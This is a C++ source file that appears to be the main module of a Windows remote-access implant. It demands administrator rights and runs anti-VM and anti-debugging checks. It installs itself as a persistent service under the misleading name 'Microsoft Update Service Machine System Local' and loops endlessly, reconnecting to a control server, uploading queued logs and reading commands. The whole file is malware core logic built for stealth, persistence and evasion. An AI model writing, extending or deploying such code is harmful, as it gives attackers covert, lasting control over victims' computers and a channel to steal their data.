#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <wtsapi32.h>
#include <iterator>
#include <cstring>
#include <cassert>
#include <tchar.h>

#include "Settings.hpp"
#include "Connection/Connection.hpp"
#include "Helper/Helper.hpp"
#include "Helper/AntiAnalysis.hpp"

#pragma comment(lib, "crypt32")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "wtsapi32.lib")


SERVICE_STATUS serviceStatus = { 0 };
SERVICE_STATUS_HANDLE hStatus = nullptr;
void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
void WINAPI ServiceCtrlHandler(DWORD request);

bool IsUserLogged()
{
    WTS_SESSION_INFO* pSessionInfo = NULL;
    DWORD dwSessionCount = 0;
    if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &dwSessionCount)) {
        if (dwSessionCount > 0) {
            WTSFreeMemory(pSessionInfo);
            return true;
        }
        WTSFreeMemory(pSessionInfo);
    }
    return false;
}

void ProgramBody()
{

    if (!Helper::IsElevated()) { exit(0); }
    Settings::InitializeSettings();
    if (Settings::AntiVM) { Helper::AntiVM::RunAntiVM(); }
    //if current payload is a duplicate
    if (!Helper::Mutex::CreateTheMutex()) { exit(0); }
    if (Settings::Autostart) {
        if (!Helper::WinService::ExistsWinService()) {
            Helper::WinService::SetWinService();
        }
    }

    while (true) // loop to check socket status
    {
        try
        {
            if (!Connection::ClientSocket::IsConnected.load())
            {
                Connection::ClientSocket::Reconnect();
                if (Connection::ClientSocket::InitializeClient()) {
                    //std::cout << "Connected" << std::endl;
                    Connection::ClientSocket::SendQueue();  // check and send any unsent logs
                    while (Connection::ClientSocket::IsConnected.load())
                    {
                        Connection::ClientSocket::ReadServerData();
                    }
                }
            }
        }
        catch (...) {}
        srand((unsigned)time(NULL));
        int random = 5 + (rand() % 10); //5-15
        Sleep(random * 1000);
    }

}

#ifdef _DEBUG
int main()
{
    // Helper::AntiDebug::RunAntiDebug();
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { const_cast<LPWSTR>(L"Microsoft Update Service Machine System Local "), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcher(ServiceTable);
    /*if (!StartServiceCtrlDispatcher(ServiceTable)){
        return 1;
    }*/
    // if run not as service will return error 1
    ProgramBody();
    return 0;
}
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    Helper::AntiDebug::RunAntiDebug();
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { const_cast<LPWSTR>(L"Microsoft Update Service Machine System Local "), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcher(ServiceTable);
    /*if (!StartServiceCtrlDispatcher(ServiceTable)){
        return 1;
    }*/
    // if run not as service will return error 1
    ProgramBody();
    return 0;
}
#endif

void ServiceMain(DWORD argc, LPTSTR* argv)
{
    hStatus = RegisterServiceCtrlHandler(L"Microsoft Update Service Machine System Local ", (LPHANDLER_FUNCTION)ServiceCtrlHandler);
    if (hStatus == NULL) {
        return;
    }
    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    if (SetServiceStatus(hStatus, &serviceStatus) == FALSE) {
        return;
    }

    // Main service logic goes here
    // The service will continue running until it's terminated externally
    while (!IsUserLogged()) { Sleep(10000); }
    ProgramBody();

    // stop service
    serviceStatus.dwWin32ExitCode = 0;
    serviceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &serviceStatus);
    return;
}

void WINAPI ServiceCtrlHandler(DWORD request)
{
    switch (request) {
    case SERVICE_CONTROL_STOP:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &serviceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &serviceStatus);
        return;

    default:
        break;
    }
    SetServiceStatus(hStatus, &serviceStatus);
    return;
}
